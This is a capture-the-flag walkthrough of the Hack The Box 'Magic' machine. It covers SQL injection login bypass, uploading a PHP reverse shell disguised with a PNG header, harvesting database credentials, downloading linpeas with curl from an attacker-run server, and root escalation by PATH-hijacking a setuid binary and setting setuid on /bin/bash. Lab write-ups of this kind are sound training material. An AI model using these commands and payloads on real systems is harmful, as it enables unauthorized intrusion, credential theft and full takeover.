:PROPERTIES:
:ID:       7ddd19fe-e04b-4fad-b835-7ffc7520692e
:END:
#+title: Magic

* Initial enumeration

We will start with a network scanning with the classic nmap command:

#+begin_src shell
nmap -sC -sV -oN nmap/initial 10.10.10.185
#+end_src

The options that we are using are:
- sC: for the default scripts
- sV: for version enumeration
- oN: for saving the output

You could also use:
- v: for verbose to view the output while it's running since this could take
  a while

We have 22(ssh) and 80(HTTP) open with Apache/2.4.29.

If we go to the page we can see that it's a lot of images and GIF, we can
also view the source but there really not a lot there except for a little hash
in the footer of the page.

Now we can use:
#+begin_src shell
nikto -host 'http://10.10.10.185/' | tee nikto.log
#+end_src

Nikto is a web scanner that can tell us a lot about the vulnerabilities
of a given site.

You can read all about it here https://github.com/sullo/nikto/wiki.
Tee is used to output into a file while, at the same time, it's displayed in
our console.

Also we will use:
#+begin_src shell
gobuster dir -u 'http://10.10.10.185/'
-w /opt/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
#+end_src

This is a tool for brute forcing directories in a domain and it's subdomains.
It uses a wordlist as an input and compares them so we have to provide that.
Mine is in there but yours could be in a different place so keep that in mind.
Also if you do not have this wordlists you
can download them from: https://github.com/danielmiessler/SecLists

We can look at the hash that was in the footer using:
#+begin_src shell :results output :wrap "quote" :exports both
echo 4d61676963 | xxd -r -p
#+end_src

#+RESULTS:
#+begin_quote
Magic
#+end_quote

So nothing particularly useful.

* Initial access

We can also try default credentials in the login page like "admin" or "root" but
there doesn't seem to be anything there.

But we can also try basic SQL injection like:
" OR 1=1 --
or:
' OR 1=1 #
And this last one worked so we now have access to the page and we can see
that it wants us to upload an image.

Now we can try to leverage the ability to upload files to use a reverse shell in
the server. We know it's using PHP so we need a PHP reverse shell. You can use
different scripts for this. I will use this:
https://github.com/pentestmonkey/php-reverse-shell

I'll modify the IP address in the script with mine. You can look yours with:
#+begin_src shell
ip a s tun0
#+end_src

The problem is that it only allows images and even if we change the file
extension of the script it does not permit it.

* Crafting a bypass

What we can do is look for what is recognized as an image file. In other
words, what is it that it is being used to verify that is an image.
If we look for the headers of a PNG file, that are used by the OS to
know what kind of file it is, we can know that every one of these files starts
with a series of bytes. These are 89 50 4e 47 0d 0a 1a 0a. But we can't just
create a new file, paste this and write our code below. We need the raw bytes.
So we can reuse the xxd command:
#+begin_src shell
echo 89504e470d0a1a0a | xxd -r -p > pngheader
#+end_src

If we concatenate that pngheader file with our script we could bypass the checks.
But if we simply call it php-reverse-shell.png it will not know what to do with it.
Since this is not a valid PNG file. But if we add .php as a first extension the
server will be able to execute it.

So:
#+begin_src shell
cat pngheader php-reverse-shell.php > reverse-shell.php.png
#+end_src

We could also do this with a simple python script:
#+begin_src python :tangle magic.py :comments link
#!/usr/bin/env python3

magic = bytearray([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A])

with open("php-reverse-shell.php", "rb") as h:
    content = h.read()

with open("reverse-shell.php.png", "wb") as h:
    h.write(magic + content)
#+end_src

* Access and internal enumeration

In one way or another we now have the file that we want to upload to the server,
the only thing that's left is to connect to it and use the reverse shell.

#+begin_src shell
pwncat -lp 1234 --config data/pwncatrc
#+end_src

Now we have to trigger it going to the
10.10.10.185/images/uploads/reverse-shell.php.png and we should have our
connection.

If it doesn't recognize a shell you can invoke bash. And pwncat has the prompt
--fancy command so you don't have to look at the horrible prompt anymore.

Now we are some random user but at least we are in the machine.

#+begin_src shell
enum -s -a
#+end_src

We could also use linpeas or other tools to do this work for us.

Furthermore we can stabilize our shell using python3 which is present in the
machine the following way:

#+begin_src bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
fg
stty raw -echo
#+end_src

Knowing there are users and images stored here we can look at the database that
is sure to be here.

If we go to /var/www/Magic we can see all of the files that make the website. And
there is a db file so we can take a look there.

This is the most direct way to know some credentials since the username (theseus)
and password (iamkingtheseus) are hardcoded there.

But this seems to be just for interacting with the database since if we try to:
#+begin_src bash
su theseus
#+end_src

The password is not correct.

We also cannot run mysql to try to look at the database. But we can use:
#+begin_src bash
mysqlshow -u theseus -p
#+end_src

And that gives us some information. I only found out typing mysql in the terminal
and pressing TAB to see what was there.

So let's try:
#+begin_src bash
mysqldump -u theseus -p
#+end_src

And we can see that there is a table called 'login' which has an INSERT statement
with 'admin' and 'Th3s3usW4sK1ng' as username and password. Now we can try to
interact with the user using these credentials.

#+begin_src bash
su theseus
#+end_src

Now we are theseus and, event though we are not root, that opens up some more
possibilities.

There is a user.txt file so we have the first flag and start looking for ways to
escalate the privileges.

Let's use linpeas for this. So copy the linpeas.sh file to a directory and from
your machine:
#+begin_src bash
python3 -m http.server 8000
#+end_src

Then from the machine:
#+begin_src bash
curl "http://<yourIP>:8000/linpeas.sh"
chmod +x linpeas.sh
./linpeas.sh
#+end_src

Linpeas tells us that the /bin/sysinfo is owned by root but accessible to us
which means it's a possible vector for privesc.

With:
#+begin_src bash
ltrace /bin/sysinfo
#+end_src

It is clear that the setuid(0) and setgid(0) allows us to abuse what the binary
is executing. And a couple of lines later we can see that it is calling
popen("lshw -short", "r").

That means that we can create a file called lshw and this binary will execute it
with the privileges of the owner, root.

So the file only needs this:
#+begin_src bash
#!/bin/bash
bash -p
#+end_src

The p flag is for keeping the setuid info.

Now:
#+begin_src bash
chomod +x lshw
sysinfo
#+end_src

And now we are root!

I had problems with viewing the output of the commands that I ran as root, not sure
why, but we can simply a:
#+begin_src bash
chmod +s /bin/bash
#+end_src

To make bash available no matter the user and just run /bin/bash -p and cat the
root.txt file to access the flag.
